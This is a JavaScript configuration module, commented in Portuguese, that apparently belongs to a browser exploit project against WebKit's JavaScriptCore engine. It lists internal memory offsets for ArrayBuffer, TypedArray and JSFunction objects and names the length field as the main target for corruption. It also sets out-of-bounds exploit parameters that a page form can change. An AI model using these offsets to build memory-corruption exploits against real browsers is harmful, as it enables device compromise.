// js/config.mjs

// Offsets para estruturas do JavaScriptCore (JSC) no ambiente alvo
// (Baseado na análise dos arquivos .txt da biblioteca WebKit)
export const JSC_OFFSETS = {
    ArrayBuffer: {
        // Modelo de indireção para byteLength (requer análise mais profunda para corrupção direta):
        // JSObject_ArrayBuffer -> [JSObject_addr + PTR_TO_INTERNAL_STRUCT_OFFSET] -> InternalStructure*
        // byteLength             -> [InternalStructure* + BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET]
        PTR_TO_INTERNAL_STRUCT_OFFSET: 0x20,    // Offset do ponteiro para a estrutura interna a partir do JSObject ArrayBuffer.
        BYTELENGTH_WITHIN_INTERNAL_STRUCT_OFFSET: 0x20 // Offset do byteLength dentro dessa estrutura interna.
                                                    // STATUS: Modelo Teórico suportado por disassembly. Corrupção direta é complexa.
    },
    TypedArray: { // JSArrayBufferView
        // Estes offsets são relativos ao início do objeto JSArrayBufferView (que é um JSObject).
        VTABLE_OFFSET: 0x0,                 // Placeholder - VTable geralmente está no início do objeto.
                                            // STATUS: Placeholder, precisa ser confirmado no disassembly se quiser usá-lo para identificação.

        M_VECTOR_OFFSET: 0x10,              // Ponteiro para os dados brutos (void* m_vector).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em JSObjectGetTypedArrayBytesPtr.txt).

        M_LENGTH_OFFSET: 0x18,              // Número de elementos (unsigned m_length).
                                            // STATUS: ALTA CONFIANÇA (offset comum, alvo primário para corrupção).
                                            // A validação funcional (ver se .length em JS muda) o comprovará.

        M_BYTELENGTH_OFFSET_IN_VIEW: 0x20,  // Tamanho em bytes da view (size_t byteLength), muitas vezes reflete a propriedade .byteLength.
                                            // STATUS: PROVÁVEL/SUPORTADO (baseado em JSArrayBufferView.txt).

        M_MODE_OFFSET: 0x28,                // Tipo de TypedArray (m_mode).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em múltiplos arquivos .txt).

        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x30 // Ponteiro para o ArrayBuffer de backing (JSArrayBuffer*).
                                            // STATUS: ALTA CONFIANÇA/COMPROVADO (baseado em JSObjectGetTypedArrayBytesPtr.txt).
    },
    JSFunction: {
        M_EXECUTABLE_OFFSET: 0x18           // Ponteiro para a estrutura executável da função.
                                            // STATUS: PLACEHOLDER (offset comum, não verificado com seus arquivos recentes).
    }
};

// Configurações Padrão do Exploit (podem ser lidas dos inputs do HTML)
export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,  // Default aumentado conforme seus testes
    BASE_OFFSET_IN_DV: 128,
    INITIAL_BUFFER_SIZE: 32
};

export function updateOOBConfigFromUI() {
    const oobAllocSizeEl = document.getElementById('oobAllocSize');
    const baseOffsetEl = document.getElementById('baseOffset');
    const initialBufSizeEl = document.getElementById('initialBufSize');

    let changed = false;
    const currentAllocSize = OOB_CONFIG.ALLOCATION_SIZE;
    const currentBaseOffset = OOB_CONFIG.BASE_OFFSET_IN_DV;
    const currentInitialBufSize = OOB_CONFIG.INITIAL_BUFFER_SIZE;

    if (oobAllocSizeEl) {
        const val = parseInt(oobAllocSizeEl.value, 10);
        if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
    }
    if (baseOffsetEl) {
        const val = parseInt(baseOffsetEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
    }
    if (initialBufSizeEl) {
        const val = parseInt(initialBufSizeEl.value, 10);
        if (!isNaN(val) && val >= 0) OOB_CONFIG.INITIAL_BUFFER_SIZE = val;
    }

    if (currentAllocSize !== OOB_CONFIG.ALLOCATION_SIZE ||
        currentBaseOffset !== OOB_CONFIG.BASE_OFFSET_IN_DV ||
        currentInitialBufSize !== OOB_CONFIG.INITIAL_BUFFER_SIZE) {
        changed = true;
        // Se a função log estivesse disponível aqui e importada:
        // log(`Config OOB atualizada: Alloc=${OOB_CONFIG.ALLOCATION_SIZE}, BaseDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitBuf=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, "info", "Config.UI");
    }
}
